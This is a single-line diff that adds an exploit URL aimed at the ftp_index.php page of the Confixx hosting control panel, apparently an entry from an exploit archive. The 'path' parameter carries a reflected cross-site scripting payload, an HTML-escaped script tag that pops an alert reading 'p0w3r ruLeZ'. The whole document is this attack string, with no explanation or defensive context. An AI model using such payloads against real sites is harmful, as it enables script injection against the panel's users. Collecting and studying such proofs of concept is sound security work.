@@ -1,0 +1,1 @@
+http://www.example.com/[confixx]/ftplogin/[user]/ftp_index.php?path=&lt;script&gt;alert(&#039;p0w3r%20ruLeZ&#039;)&lt;/script&gt;
